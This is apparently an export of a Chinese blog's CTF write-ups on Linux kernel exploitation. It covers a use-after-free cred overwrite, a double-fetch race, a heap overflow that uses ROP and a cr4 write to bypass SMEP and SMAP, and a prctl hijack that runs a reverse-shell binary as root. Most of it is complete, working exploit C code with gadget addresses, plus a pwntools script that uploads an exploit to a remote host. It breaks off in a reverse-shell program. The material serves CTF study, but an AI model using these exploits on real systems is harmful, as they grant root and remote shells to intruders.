使用slab&#x2F;slub来分配内存，与glibc下的ptmalloc相同点是，如**[果在空闲的堆里存在符合申请的大小的堆]{.mark}，则直接把这个堆处理后返回给申请方。为了提权，关键就是修改进程的cred结构，而进程的cred结构也是保存在堆里，进程创建时，就会申请cred结构的空间，来存放cred结构。[如果cred结构申请到我们能控制的空间里，那么我们就能自由修改cred结构，实现提权。]{.mark}**\n为了实现这个目的，[我们可以申请一个与cred结构大小相等的堆，然后释放掉]{.mark}。这样，如果我们**[接下来fork一个子进程]{.mark}**，那么子进程申请cred结构的空间时，发现空闲堆里有符合的堆，则拿过来用，而这个堆正是我们UAF能够控制的。**利用UAF，把cred结构里的uid、gid等覆盖为0，即可得到root权限。**至于cred的大小如何确定，有两种方法，第一种是查看对应版本的linux内核源码；第二种则是写一个简易的c语言程序，输出cred的大小。\n[本题的linux内核版本为4.4.72，cred结构大小为0xA8。]{.mark}\n知道了以上的原理后，我们就可以编写exploit.c程序来提权了。\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;  #include &lt;sys/wait.h&gt;    int main() &#123;     int fd1 = open(&quot;/dev/babydev&quot;,O_RDWR);     int fd2 = open(&quot;/dev/babydev&quot;,O_RDWR);     char buf[30];     if (fd1 &lt; 0 || fd2 &lt; 0) &#123;        printf(&quot;open file error!!\\n&quot;);        exit(-1);     &#125;     //申请一个与cred结构体大小一样的堆     ioctl(fd1,0x10001,0xA8);     //释放这个堆     close(fd1);     int pid = fork();     if (pid &lt; 0) &#123;        printf(&quot;[-]fork error!!\\n&quot;);        exit(-1);     &#125; else if (pid == 0) &#123; //子进程        //UAF，通过fd2，覆盖子进程的cred结构里的几个uid、gid        memset(buf,0,28);        write(fd2,buf,28);        if (getuid() == 0) &#123;           printf(&quot;[+]rooted!!\\n&quot;);           system(&quot;/bin/sh&quot;);        &#125;     &#125; else &#123; //父进程等待子进程结束        wait(NULL);     &#125;     close(fd2);     return 0;  &#125; ","categories":["CTF"],"tags":["UAF","Linux Kernel"]},{"title":"linux kernel pwn学习之double fetch","url":"/2020/02/27/linux_kernel_pwn_double_fetch/","content":"Double fetch漏洞是一种条件竞争漏洞，由于多线程的原因，使得内核里多次访问到用户的数据不一致而引发的漏洞。我们用户态传数据给内核，如果是简单的数据，则按传值传递，如果数据量很大很复杂，我们则传指针给内核。内核里首先会对数据的合理性进行校验，校验成功后，待会内核又重新在某处来访问我们的数据，而如果有另外一个线程在这之前篡改了数据，就使得数据不一致，从而可能形成漏洞。\n我们以0ctf2018-final-baby这题为例\n首先，我们用IDA分析一下ko驱动文件\n\n\n经过分析，驱动里的ioctl函数定义了两个交互命令，0x6666命令，用于获取驱动里的flag的地址,0x1337用于传递给驱动数据，如果检验成功，则输出flag。\n检验点有三个\n\n传递的数据指针范围必须在用户态内存内\n\n传递的长度必须等于真正的flag的长度\n\n传递的flag的内容必须与内核里的flag内容一样\n\n\n传给内核的数据结构如下\ntypedef struct &#123;     char *flag_addr;     size_t len;  &#125; Data;  \n\n显然，我们直接把flag_addr传为内核给我们的那个flag地址，不能通过if里面的验证。我们可以以多线程来思考这个问题。我们开一个线程，里面不断的修改flag_addr为内核态的flag地址。然后再来一个线程，不断向内核传输能够通过验证的数据。两个线程会有碰撞，如果第二个线程在某时刻，数据通过了内核的验证，但内核还没有执行for循环，此时，另一个线程，修改了用户态的flag_addr，将它指向了内核态的flag。接下来，第二个线程开始执行for循环了，通过验证，最后输出flag。\n我们的exploit.c程序，如果没有得到flag，可以多试几次，注意使用静态编译。\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;string.h&gt;  #include &lt;sys/ioctl.h&gt;  #include &lt;pthread.h&gt;    #define LINE_LEN 0x100  //碰撞次数  #define TRYTIME 0x3000    //传给驱动的数据结构  typedef struct &#123;     char *flag_addr;     size_t len;  &#125; Data;  //我们用户态的一段缓冲区  char user_buf[0x34] = &#123;0&#125;;  int finished = 0;      long flag_addr = -1; //内核返回给我们的flag_addr地址  //这个线程，用于修改通过验证的data里面的flag_addr  void changeFlagAddr(void *s) &#123;     Data *data = (Data *)s;     while (!finished) &#123;        data-&gt;flag_addr = (char *)flag_addr;     &#125;  &#125;    int main() &#123;     //线程句柄     pthread_t t1;     //打开驱动的文件描述符     int fd = open(&quot;/dev/baby&quot;,O_RDWR);     //请求驱动返回给我们flag的地址     ioctl(fd,0x6666);     //关闭标准输入输出缓冲     setvbuf(stdin,0,2,0);     setvbuf(stdout,0,2,0);     setvbuf(stderr,0,2,0);     //读取flag的地址     FILE *info = popen(&quot;dmesg&quot;,&quot;r&quot;);     fseek(info,-LINE_LEN,SEEK_END);     char line[1024];     while (fgets(line, sizeof(line),info) != NULL) &#123;        char *index;        if ((index = strstr(line,&quot;Your flag is at &quot;))) &#123;           index += strlen(&quot;Your flag is at &quot;);           flag_addr = strtoull(index,index+16,16);        &#125;     &#125;     pclose(info);     if (flag_addr == -1) &#123;        printf(&quot;error:get flag addr!\\n&quot;);        exit(-1);     &#125;     printf(&quot;flag_addr=0x%lx\\n&quot;,flag_addr);     //准备好我们的数据，全为用户态数据，待会发给驱动，通过验证     Data data;     data.flag_addr = user_buf;     data.len = 33;     //开启一个线程，不断尝试把flag_addr指向内核态的flag_addr     pthread_create(&amp;t1, NULL,changeFlagAddr,&amp;data);     //正常线程，不断尝试发送合法的数据给驱动     for (int i=0;i&lt;TRYTIME;i++) &#123;        ioctl(fd,0x1337,&amp;data);        data.flag_addr = user_buf;     &#125;     finished = 1;     //等待线程结束     pthread_join(t1, NULL);     //关闭文件描述符     close(fd);     puts(&quot;the result is:&quot;);     system(&quot;dmesg | grep flag&quot;);     return 0;  &#125;  \n\n如果在远程，我们则先在本地编译好二进制文件，然后借助于base64编码来传送二进制文件到远程执行。\ntransfer.py\n#coding:utf8  from pwn import *  import base64    sh = remote(&#x27;xxx&#x27;,10100)    #我们编写好的exploit  f = open(&#x27;./exploit&#x27;,&#x27;rb&#x27;)  content = f.read()  total = len(content)  f.close()  #每次发送这么长的base64，分段解码  per_length = 0x200;  #创建文件  sh.sendlineafter(&#x27;$&#x27;,&#x27;touch /tmp/exploit&#x27;)  for i in range(0,total,per_length):     bstr = base64.b64encode(content[i:i+per_length])     sh.sendlineafter(&#x27;$&#x27;,&#x27;echo &#123;&#125; | base64 -d &gt;&gt; /tmp/exploit&#x27;.format(bstr))  if total - i &gt; 0:     bstr = base64.b64encode(content[total-i:total])     sh.sendlineafter(&#x27;$&#x27;,&#x27;echo &#123;&#125; | base64 -d &gt;&gt; /tmp/exploit&#x27;.format(bstr))    sh.sendlineafter(&#x27;$&#x27;,&#x27;chmod +x /tmp/exploit&#x27;)  sh.sendlineafter(&#x27;$&#x27;,&#x27;/tmp/exploit&#x27;)      sh.interactive() \n\n本题还可以使用盲注，因为flag被硬编码在ko驱动文件里，我们可以在用户态mmap两块内存，其中第一块内存可读写，第二块内存设置不可读写，然后，我们将需要对比的那个字符放在第1块内存的末尾，由于第二块内存不可读写，驱动在执行for循环对比字符时，如果我们猜测的前一个字符是正确的，将会继续访问下一个字符，而下一个字符的位置在第二块不可读写的内存，此时内核就会报错。由此，我们可以来判断是否猜测正确。\n","categories":["CTF"],"tags":["Linux Kernel","double fetch"]},{"title":"linux kernel pwn学习之堆漏洞利用+bypass smap、smep","url":"/2020/03/01/linux_kernel_pwn_heap_bypass_smap_smep/","content":"Linux内核使用的是slab&#x2F;slub分配器，与glibc下的ptmalloc有许多类似的地方。比如kfree后，[原来的用户数据区的前8字节会有指向下一个空闲块的指针]{.mark}。如果用户请求的大小在空闲的堆块里有满足要求的，则直接取出。\n通过调试，可以发现，被释放的堆的**[数据域前8字节]{.mark}正好指向下一个空闲堆的[数据域]{.mark}**\n\n\n与glibc下的ptmalloc2不同的是，slab&#x2F;slub分配的堆的大小不是数据域加头结构的大小，而是与slab&#x2F;slub里面的内存”桶”对齐的。我们可以查看slab&#x2F;slub有哪些”桶”，以root身份，在终端输入\n//查看slab的内存桶  # cat /proc/slabinfo  \n\n\n\n我们看到，有这些桶，比如8K的，专门管理8K的堆空间，16字节的专门管理16字节的堆空间。而**[我们申请的空间大小，是向上对齐，比如，我们要申请600字节的空间，那么slab分配的空间大小实际为1K。并且，大小相同的堆靠在一起。]{.mark}**\n因此，如果要利用溢出写的话，应该以实际大小来计算偏移等。\n还有一个比较容易利用的就是，[我们如果可以伪造空闲块的next指针，则可以很容易分配到我们想要读写的地方]{.mark}，不像ptmalloc2里的堆那样，还需要伪造堆结构，这里**[只需要更改next指针，即可达到目的]{.mark}**，为了加深理解，我们以starctf2019-hackme这题为例\nstarctf2019-hackme首先，查看一下启动脚本，发现，开启了smap、smep机制，这意味着，内核态里面不能直接访问用户态的数据，而应该拷贝到内核的空间；内核态不能执行用户空间的代码，否则会触发页错误。\nqemu-system-x86_64 \\      -m 256M \\      -nographic \\      -kernel bzImage \\      -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \\      -monitor /dev/null \\      -initrd initramfs.cpio \\      -smp cores=4,threads=2 \\      -gdb tcp::1234 \\      -cpu qemu64,smep,smap 2&gt;/dev/null  \n\n然后，我们用IDA分析一下驱动文件hackme.ko\n类似于用户态程序常规的增删改查堆题\n\n\n经过分析，用户态需要传入的数据结构体为\n//发送给驱动的数据结构  struct Data &#123;     uint32_t index; //下标     uint32_t padding; //填充     char *buf; //用户的数据     int64_t buf_len; //用户的数据的长度     int64_t offset; //偏移  &#125;;  \n\n漏洞点在于**[offset和user_buf_len是有符号数]{.mark}，那么，我们就能[一个传入负数，一个传入正数，实现堆溢出，我们可以轻松的向上溢出]{.mark}**，修改前面的区域。\n首先，不急于做题\n为了证明我们可以轻松的伪造空闲堆的前八字节的next指针，从而达到分配到任意地址，我们做个试验。那么，我们需要先关闭smap机制，在脚本里把它注释掉。然后，我们通过溢出，修改next指针，看看，这里是test.c\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;stdint.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;    //驱动的fd  int fd;    void initFD() &#123;     fd = open(&quot;/dev/hackme&quot;,O_RDWR);     if (fd &lt; 0) &#123;        printf(&quot;open file error!!\\n&quot;);        exit(-1);     &#125;  &#125;    //发送给驱动的数据结构  struct Data &#123;     uint32_t index; //下标     uint32_t padding; //填充     char *buf; //用户的数据     int64_t buf_len; //用户的数据的长度     int64_t offset; //偏移  &#125;;    //创建堆  void create(unsigned int index,char *buf,int64_t len) &#123;     struct Data data;     data.index = index;     data.buf = buf;     data.buf_len = len;     data.offset = 0;     ioctl(fd,0x30000,&amp;data);  &#125;    void kdelete(unsigned int index) &#123;     struct Data data;     data.index = index;     ioctl(fd,0x30001,&amp;data);  &#125;    void edit(unsigned int index,char *buf,int64_t len,int64_t offset)&#123;     struct Data data;     data.index = index;     data.buf = buf;     data.buf_len = len;     data.offset = offset;     ioctl(fd,0x30002,&amp;data);  &#125;    void readBuf(unsigned int index,char *buf,int64_t len,int64_t offset) &#123;     struct Data data;     data.index = index;     data.buf = buf;     data.buf_len = len;     data.offset = offset;     ioctl(fd,0x30003,&amp;data);  &#125;    char buf[0x1000] = &#123;0&#125;;    char buf2[0x100]= &#123;0&#125;;    void fillBuf() &#123;     for (int i=0;i&lt;0x1000;i++) &#123;        buf[i] = &#x27;a&#x27;;     &#125;  &#125;  int main() &#123;     initFD();     create(0,buf,0x100); //0     create(1,buf,0x100); //1     kdelete(0);     //修改堆0的next指针，指向我们用户区的buf2     ((size_t *)buf)[0] = &amp;buf2;     edit(1,buf,0x100,-0x100);     //为了看的清除，我们把buf填充上数据     fillBuf();     //分配堆0     create(0,buf,0x100); //0     //分配到buf2     create(2,buf,0x100); //2     //全程，我们没有给buf2填充，我们看看buf2现在的内容     printf(&quot;buf2=%s\\n&quot;,buf2);     return 0;  &#125;  \n\n程序执行后，结果是这样的\n\n\n可以看到，我们通过伪造空闲堆块的next指针，就直接实现了任意地址的读写。这比用户态的堆简单多了。\n那么，本题的解题思路自然是很多\n/*  * initialise the credentials stuff  */  void __init cred_init(void)  &#123;      /* allocate a slab in which we can store credentials */      cred_jar = kmem_cache_create(&quot;cred_jar&quot;, sizeof(struct cred), 0,              SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);  &#125;  \n\n我们可以在调试期间，修改启动脚本，使得系统一开始就是root权限，然后，我们查看一下cred_init的地址\n# cat /proc/kallsyms | grep cred_init  ffffffff84670946 T cred_init  \n\n然后，我们用IDA打开vmlinux文件，没有的话，可以用extract-vmlinux解压出来。根据地址后几字节，找到这个函数\n\n\n我们查看函数，就能得到cred结构的大小\n\n\n但是，由于cred结构的申请使用的是create_kmalloc_cache，这意味着它不大可能直接从我们这边的空闲堆块里取，而是从它的缓存空间里分配。\n因此，我们来了一个可靠的\n方法3，分配tty_struct结构到空闲堆之前，我在https://blog.csdn.net/seaaseesa/article/details/104577501这篇博客里详细讲到了UAF控制tty_struct，这里是同样的道理，我们能够使用堆溢出来控制。本题，我们要还要克服一个限制，那就是smap机制，**[smap机制不让内核直接使用用户空间的数据，而我们的rop、伪造的fake_tty_operations都布置在用户空间的内存里。与smep一样，判断它们的开启与否，都是看cr4寄存器里的值，如果在之前能够有机会执行mov cr4,xxx,使得cr4寄存器的第21位为0，即可关闭smap机制。]{.mark}**然而，比较难有这个机会，因此我们直接把这些数据复制一份到内核的堆里，即可绕过这个机制。\n当我们把rop、fake_tty_operations布置在堆里，那么，我们还需要泄露堆地址，才能利用。泄露堆地址很简单，溢出读取前一个空闲堆块的next域即可。\n直接上完整的exp\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;stdint.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;    //tty_struct结构体的大小  #define TTY_STRUCT_SIZE 0x2E0  //如果我们申请0x2E0的空间，slab分配的堆实际大小为0x400  #define REAL_HEAP_SIZE 0x400  //二进制文件的静态基址  #define RAW_KERNEL_BASE 0XFFFFFFFF81000000  //mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret  size_t MOV_CR4_RAX = 0xffffffff8100252b;  //swapgs ; popfq ; pop rbp ; ret  size_t SWAPGS = 0xffffffff81200c2e;  //iretq  size_t IRETQ = 0xFFFFFFFF81019356;  //commit_creds函数  size_t COMMIT_CREDS = 0xFFFFFFFF8104D220;  // prepare_kernel_cred  size_t PREPARE_KERNEL_CRED = 0xFFFFFFFF8104D3D0;  //push rax ; pop rsp ; cmp qword ptr [rdi + 8], rdx ; jae 0xffffffff810608e8 ; ret做栈迁移用  size_t PUSH_RAX_POP_RSP = 0xffffffff810608d5;  size_t POP_RAX = 0xffffffff8101b5a1;  size_t POP_RSP = 0xffffffff810484f0;    //驱动的fd  int fd;    void initFD() &#123;     fd = open(&quot;/dev/hackme&quot;,O_RDWR);     if (fd &lt; 0) &#123;        printf(&quot;open file error!!\\n&quot;);        exit(-1);     &#125;  &#125;    //发送给驱动的数据结构  struct Data &#123;     uint32_t index; //下标     uint32_t padding; //填充     char *buf; //用户的数据     int64_t buf_len; //用户的数据的长度     int64_t offset; //偏移  &#125;;    //创建堆  void create(unsigned int index,char *buf,int64_t len) &#123;     struct Data data;     data.index = index;     data.buf = buf;     data.buf_len = len;     data.offset = 0;     ioctl(fd,0x30000,&amp;data);  &#125;    void kdelete(unsigned int index) &#123;     struct Data data;     data.index = index;     ioctl(fd,0x30001,&amp;data);  &#125;    void edit(unsigned int index,char *buf,int64_t len,int64_t offset)&#123;     struct Data data;     data.index = index;     data.buf = buf;     data.buf_len = len;     data.offset = offset;     ioctl(fd,0x30002,&amp;data);  &#125;    void readBuf(unsigned int index,char *buf,int64_t len,int64_t offset) &#123;     struct Data data;     data.index = index;     data.buf = buf;     data.buf_len = len;     data.offset = offset;     ioctl(fd,0x30003,&amp;data);  &#125;    char buf[0x1000] = &#123;0&#125;;    //初始化函数和gadgets的地址  void init_addr(size_t kernel_base) &#123;     MOV_CR4_RAX += kernel_base - RAW_KERNEL_BASE;     printf(&quot;mov_cr4_rax_addr=0x%lx\\n&quot;,MOV_CR4_RAX);     SWAPGS += kernel_base - RAW_KERNEL_BASE;     printf(&quot;swapgs_addr=0x%lx\\n&quot;,SWAPGS);     IRETQ += kernel_base - RAW_KERNEL_BASE;     printf(&quot;iretq_addr=0x%lx\\n&quot;,IRETQ);     COMMIT_CREDS += kernel_base - RAW_KERNEL_BASE;     printf(&quot;commit_creds_addr=0x%lx\\n&quot;,COMMIT_CREDS);     PREPARE_KERNEL_CRED += kernel_base - RAW_KERNEL_BASE;     printf(&quot;prepare_kernel_cred_addr=0x%lx\\n&quot;,PREPARE_KERNEL_CRED);     PUSH_RAX_POP_RSP += kernel_base - RAW_KERNEL_BASE;     printf(&quot;push_rax_pop_rsp_addr=0x%lx\\n&quot;,PUSH_RAX_POP_RSP);     POP_RSP += kernel_base - RAW_KERNEL_BASE;     printf(&quot;pop_rsp_addr=0x%lx\\n&quot;,POP_RSP);     POP_RAX += kernel_base - RAW_KERNEL_BASE;     printf(&quot;pop_rax_addr=0x%lx\\n&quot;,POP_RAX);  &#125;    void getRoot() &#123;     //函数指针     void *(*pkc)(int) = (void *(*)(int))PREPARE_KERNEL_CRED;     void (*cc)(void *) = (void (*)(void *))COMMIT_CREDS;     //commit_creds(prepare_kernel_cred(0))     (*cc)((*pkc)(0));  &#125;    void getShell() &#123;     if (getuid() == 0) &#123;        printf(&quot;[+]Rooted!!\\n&quot;);        system(&quot;/bin/sh&quot;);     &#125; else &#123;        printf(&quot;[+]Root Fail!!\\n&quot;);     &#125;  &#125;    size_t user_cs,user_ss,user_flags,user_sp;  /*保存用户态的寄存器到变量里*/  void saveUserState() &#123;     __asm__(&quot;mov %cs,user_cs;&quot;             &quot;mov %ss,user_ss;&quot;             &quot;mov %rsp,user_sp;&quot;             &quot;pushf;&quot;             &quot;pop user_flags;&quot;             );    puts(&quot;user states have been saved!!&quot;);  &#125;    int main() &#123;     //保存用户态寄存器     saveUserState();     initFD();     //创建一个与TTY_STRUCT_SIZE结构体大小一样的堆     create(0,buf,TTY_STRUCT_SIZE);     //由slab分配器的性质，大小相同的堆挨在一起，所以我们     //再创建一个TTY_STRUCT_SIZE的堆，用于向上越界     create(1,buf,TTY_STRUCT_SIZE);     //释放大小为TTY_STRUCT_SIZE的第一个堆     kdelete(0);     //由于开启了smap，我们需要把ROP、fake_tty_operations这些放内核的堆空间里     create(2,buf,0x100);     create(3,buf,0x100);     kdelete(2);     //2里面会有下一个空闲块的地址,就能算出2的地址     readBuf(3,buf,0x100,-0x100);     size_t heap_addr = ((size_t *)buf)[0] - 0x200;     printf(&quot;heap2_addr=0x%lx\\n&quot;,heap_addr);     //伪造tty_operations函数表     size_t fake_tty_operations[0x20];     //tty_struct结构申请到了堆0     int tty_fd = open(&quot;/dev/ptmx&quot;,O_RDWR);     //将tty_struct结构读取出来     readBuf(1,buf,REAL_HEAP_SIZE,-REAL_HEAP_SIZE);     //获得一个vmlinux里的某处地址，减去偏移，就是内核的基地址     size_t kernel_base = ((size_t *)buf)[3] - 0x625D80;     printf(&quot;kernel_base=0x%lx\\n&quot;,kernel_base);     //初始化gadgets和函数的地址     init_addr(kernel_base);     //构造ROP     size_t rop[0x20];     int i = 0;     /*rop同时关闭了smap、semp*/     rop[i++] = POP_RAX;     rop[i++] = 0x6f0;     rop[i++] = MOV_CR4_RAX;     rop[i++] = 0;     rop[i++] = (size_t)getRoot;     rop[i++] = SWAPGS;     rop[i++] = 0;     rop[i++] = 0;     rop[i++] = IRETQ;     rop[i++] = (size_t)getShell;     rop[i++] = user_cs;     rop[i++] = user_flags;     rop[i++] = user_sp;     rop[i++] = user_ss;     //将rop保存到内核的堆里，绕过smap     create(2,(char *)rop,0x100);     size_t rop_addr = heap_addr;     //对tty_fd执行write，将触发这个gadget进行第一次转转移     fake_tty_operations[7] = PUSH_RAX_POP_RSP;     //栈再一次转移到rop数组里     fake_tty_operations[0] = POP_RSP;     fake_tty_operations[1] = rop_addr;     //将fake_tty_operations保存到内核的堆里，绕过smap     kdelete(3);     create(3,(char *)fake_tty_operations,0x100);     size_t fake_tty_operations_addr = heap_addr + 0x100;     ((size_t *)buf)[3] = fake_tty_operations_addr; //篡改tty_operations指针     edit(1,buf,REAL_HEAP_SIZE,-REAL_HEAP_SIZE); //把篡改后的数据写回去     //触发栈转移，执行ROP     write(tty_fd,buf,0x10);     return 0;  &#125;\n\n\n","categories":["CTF"],"tags":["Linux Kernel","Linux内核堆","tty_struct","slab/slub","smap/smep"]},{"title":"linux kernel pwn学习之hijack prctl","url":"/2020/03/06/linux_kernel_pwn_hijack_prctl/","content":"Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。\n我们分析一下prctl源码，在linux&#x2F;kernel&#x2F;sys.c里，我们看到这\n\n\n我们继续跟进，查看security_task_prctl函数，在linux&#x2F;security&#x2F;security.c文件里找到\n\n\n函数调用了task_prctl表里的函数，因此，如果我们劫持task_prctl表，就能通过执行prctl来执行我们想要的函数，比如call_usermodehelper函数。为了确定我们该劫持的表的地址，我们先写一个小demo.c\n#include &lt;sys/prctl.h&gt;    int main() &#123;     prctl(0,0);  &#125;  \n\n然后，编译，放到系统里，我们先查看一下security_task_prctl函数的地址\n\n\n接下来，我们用gdb在这里断点，然后运行我们的demo程序\n\n\n成功断点\n\n\n继续单步运行，到这里\n\n\n从而，我们确定了task_prctl表的地址，减去内核基地址，我们就能确定task_prctl的偏移了。在这里，我们得到的是偏移是0xeb8118。\n有一点不幸的是, 传入security_task_prctl函数的第一个参数被截断了，这意味着，如果我们把task_prctl劫持为call_usermodehelper，在64位下不能完成利用。\n\n\n因为call_usermodehelper函数的第一个参数是一个字符串地址\n\n\n为了解决这个问题，我们可以借鉴一下glibc下劫持为one_gadget的思想，我们来搜索一下有没有类似的one_gadget可以使用。我们在内核源码里搜索哪些函数调用了call_usermodehelper函数。\n\n\n我们发现mce_do_trigger函数可以用，它调用call_usermodehelper函数的前两个参数来自全局数据段，或许可以被我们劫持修改\n\n\n我们有找到几个合适的\n\n\n其中run_cmd调用了call_usermodehelper函数。由此，**我们只需要把prctl_task劫持到这几个函数，比如__orderly_poweroff，然后篡改poweroff_cmd为我们需要执行的二进制文件路径。接着调用prctl，就会以root权限执行我们的二进制文件，从而提权。**我们可以执行一个反弹shell的程序，然后用nc来连接。\n为了实现上述目标，我们首先需要得到内核基址，之前，我在https://blog.csdn.net/seaaseesa/article/details/104694219这篇博客里讲到了劫持vdso，我们同样需要利用一下，我们计算出了vdso的地址后，就能算出内核的基址，因为它们之间的差值是不变的。\n我们以CSAW-2015-StringIPC为例，它的exploit.c如下\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;  #include &lt;sys/prctl.h&gt;  #include &lt;sys/time.h&gt;  #include &lt;sys/auxv.h&gt;    #define CSAW_IOCTL_BASE     0x77617363  #define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1  #define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2  #define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3  #define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4  #define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5  #define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6  #define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7  #define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8  //poweroff字符串的偏移  #define POWEROFF_CMD 0xE4DFA0  //orderly_poweroff函数的偏移  #define ORDERLY_POWEROFF 0x9c950  //task_prctl的偏移  #define TASK_PRCTL 0xeb8118;    struct alloc_channel_args &#123;      size_t buf_size;      int id;  &#125;;    struct shrink_channel_args &#123;      int id;      size_t size;  &#125;;    struct read_channel_args &#123;      int id;      char *buf;      size_t count;  &#125;;    struct write_channel_args &#123;      int id;      char *buf;      size_t count;  &#125;;    struct seek_channel_args &#123;      int id;      loff_t index;      int whence;  &#125;;    void errExit(char *msg) &#123;     puts(msg);     exit(-1);  &#125;  //驱动的文件描述符  int fd;  //初始化驱动  void initFD() &#123;     fd = open(&quot;/dev/csaw&quot;,O_RDWR);     if (fd &lt; 0) &#123;        errExit(&quot;[-] open file error!!&quot;);     &#125;  &#125;    //申请一个channel,返回id  int alloc_channel(size_t size) &#123;     struct alloc_channel_args args;     args.buf_size = size;     args.id = -1;     ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;args);     if (args.id == -1) &#123;        errExit(&quot;[-]alloc_channel error!!&quot;);     &#125;     return args.id;  &#125;    //改变channel的大小  void shrink_channel(int id,size_t size) &#123;     struct shrink_channel_args args;     args.id = id;     args.size = size;     ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;args);  &#125;  //seek  void seek_channel(int id,loff_t offset,int whence) &#123;     struct seek_channel_args args;     args.id = id;     args.index = offset;     args.whence = whence;     ioctl(fd,CSAW_SEEK_CHANNEL,&amp;args);  &#125;  //读取数据  void read_channel(int id,char *buf,size_t count) &#123;     struct read_channel_args args;     args.id = id;     args.buf = buf;     args.count = count;     ioctl(fd,CSAW_READ_CHANNEL,&amp;args);  &#125;  //写数据  void write_channel(int id,char *buf,size_t count) &#123;     struct write_channel_args args;     args.id = id;     args.buf = buf;     args.count = count;     ioctl(fd,CSAW_WRITE_CHANNEL,&amp;args);  &#125;  //任意地址读  void arbitrary_read(int id,char *buf,size_t addr,size_t count) &#123;     seek_channel(id,addr-0x10,SEEK_SET);     read_channel(id,buf,count);  &#125;  //任意地址写  //由于题目中使用了strncpy_from_user,遇到0就会截断，因此，我们逐字节写入  void arbitrary_write(int id,char *buf,size_t addr,size_t count) &#123;     for (int i=0;i&lt;count;i++) &#123;        seek_channel(id,addr+i-0x10,SEEK_SET);        write_channel(id,buf+i,1);     &#125;  &#125;  //获取vdso里的字符串&quot;gettimeofday&quot;相对vdso.so的偏移  int get_gettimeofday_str_offset() &#123;     //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx     size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);     char* name = &quot;gettimeofday&quot;;     if (!vdso_addr) &#123;        errExit(&quot;[-]error get name&#x27;s offset&quot;);     &#125;     //仅需要搜索1页大小即可，因为vdso映射就一页0x1000     size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));     if (name_addr &lt; 0) &#123;        errExit(&quot;[-]error get name&#x27;s offset&quot;);     &#125;     return name_addr - vdso_addr;  &#125;    int main() &#123;     char *buf = (char *)calloc(1,0x1000);     initFD();     //申请一个channel，大小0x100     int id = alloc_channel(0x100);     //改变channel大小，形成漏洞,实现任意地址读写     shrink_channel(id,0x101);     //获取gettimeofday字符串在vdso.so里的偏移     int gettimeofday_str_offset = get_gettimeofday_str_offset();     printf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;,gettimeofday_str_offset);     size_t vdso_addr = -1;     for (size_t addr=0xffffffff80000000;addr &lt; 0xffffffffffffefff;addr += 0x1000) &#123;        //读取一页数据        arbitrary_read(id,buf,addr,0x1000);        //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址        //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页        if (!strcmp(buf+gettimeofday_str_offset,&quot;gettimeofday&quot;)) &#123;           printf(&quot;[+]find vdso.so!!\\n&quot;);           vdso_addr = addr;           printf(&quot;[+]vdso in kernel addr=0x%lx\\n&quot;,vdso_addr);           break;        &#125;     &#125;     if (vdso_addr == -1) &#123;        errExit(&quot;[-]can&#x27;t find vdso.so!!&quot;);     &#125;     //计算出kernel基地址     size_t kernel_base = vdso_addr &amp; 0xffffffffff000000;     printf(&quot;[+]kernel_base=0x%lx\\n&quot;,kernel_base);     size_t poweroff_cmd_addr = kernel_base + POWEROFF_CMD;     printf(&quot;[+]poweroff_cmd_addr=0x%lx\\n&quot;,poweroff_cmd_addr);     size_t orderly_poweroff_addr = kernel_base + ORDERLY_POWEROFF;     printf(&quot;[+]poweroff_cmd_addr=0x%lx\\n&quot;,orderly_poweroff_addr);     size_t task_prctl_addr = kernel_base + TASK_PRCTL;     printf(&quot;[+]task_prctl_addr=0x%lx\\n&quot;,task_prctl_addr);     //反弹shell，执行的二进制文件，由call_usermodehelper来执行，自带root     char reverse_command[] = &quot;/reverse_shell&quot;;     //修改poweroff_cmd_addr处的字符串为我们需要执行的二进制文件的路径     arbitrary_write(id,reverse_command,poweroff_cmd_addr,strlen(reverse_command));     //hijack prctl，使得task_prctl指向orderly_poweroff函数     arbitrary_write(id,&amp;orderly_poweroff_addr,task_prctl_addr,8);     if (fork() == 0) &#123; //fork一个子进程，来触发shell的反弹        prctl(0,0);        exit(-1);     &#125; else &#123;        printf(&quot;[+]open a shell\\n&quot;);        system(&quot;nc -lvnp 7777&quot;);     &#125;       return 0;  &#125;\n\n而qwb2018-solid_core同样，也是这个解法，稍作一下修改即可。反弹shell的程序如下\n#include&lt;stdio.h&gt;  #include&lt;stdlib.h&gt;  #include&lt;sys/socket.h&gt;  #include&lt;netinet/in.h&gt;  